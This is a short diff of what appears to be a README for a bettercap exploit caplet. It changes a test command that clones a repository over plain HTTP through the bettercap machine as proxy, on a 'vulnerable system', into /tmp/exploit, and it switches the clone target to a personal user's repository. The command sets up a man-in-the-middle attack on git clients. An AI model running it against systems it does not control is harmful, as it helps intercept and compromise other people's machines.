@@ -50,7 +50,7 @@ You can test the script yourself without arp poison:
 3. On vulnerable system run: 
 
 ```
-http_proxy=<ip address of bettercap machine><bettercap_http_port> git clone --recursive http://github.com/bettercap/bettercap /tmp/exploit
+http_proxy=<ip address of bettercap machine><bettercap_http_port> git clone --recursive http://github.com/yaswanthswarna444-prog/caplets /tmp/exploit
 ```
 
 (**NOTE**: we are intentionally trying to clone via http on github)
